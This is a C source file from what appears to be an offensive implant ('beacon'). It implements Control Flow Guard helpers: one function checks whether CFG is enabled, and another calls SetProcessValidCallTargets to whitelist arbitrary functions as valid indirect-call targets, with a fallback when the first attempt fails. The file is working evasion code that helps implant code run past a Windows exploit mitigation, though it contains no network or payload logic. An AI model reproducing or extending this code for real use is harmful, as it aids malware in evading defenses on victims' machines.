/* beacon/src/Core/Cfg.c
 * Control Flow Guard helpers - query status, whitelist targets. */

#include "Macros.h"
#include "Instance.h"
#include "Cfg.h"

FUNC VOID NaxCfgInit( PNAX_INSTANCE Nax ) {
    Nax->CfgEnabled = FALSE;

    if ( !Nax->Kernel32.GetProcessMitigationPolicy )
        return;

    NAX_CFG_POLICY policy;
    MmZero( &policy, sizeof( policy ) );

    if ( Nax->Kernel32.GetProcessMitigationPolicy( (HANDLE)-1, NAX_POLICY_CFG, &policy, sizeof( policy ) ) )
        Nax->CfgEnabled = policy.EnableControlFlowGuard;

    NaxDbg( Nax, "[cfg] enabled=%d", (INT)Nax->CfgEnabled );
}

FUNC BOOL NaxCfgAddTarget( PNAX_INSTANCE Nax, PVOID ImageBase, PVOID Function ) {
    if ( !Nax->CfgEnabled )
        return TRUE;

    if ( !Nax->Kernelbase.SetProcessValidCallTargets )
        return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)( (PBYTE)ImageBase + dos->e_lfanew );
    SIZE_T length = ( (SIZE_T)nt->OptionalHeader.SizeOfImage + 0xFFF ) & ~(SIZE_T)0xFFF;

    CFG_CALL_TARGET_INFO cfg;
    cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );
    cfg.Flags  = CFG_CALL_TARGET_VALID | CFG_CALL_TARGET_CONVERT_EXPORT_SUPPRESSED_TO_VALID;

    BOOL ok = Nax->Kernelbase.SetProcessValidCallTargets( (HANDLE)-1, ImageBase, length, 1, &cfg );
    if ( !ok ) {
        cfg.Flags = CFG_CALL_TARGET_VALID;
        ok = Nax->Kernelbase.SetProcessValidCallTargets( (HANDLE)-1, ImageBase, length, 1, &cfg );
    }
    NaxDbg( Nax, "[cfg] add target: base=%p func=%p offset=0x%llx ok=%d", ImageBase, Function, (UINT64)cfg.Offset, (INT)ok );
    return ok;
}
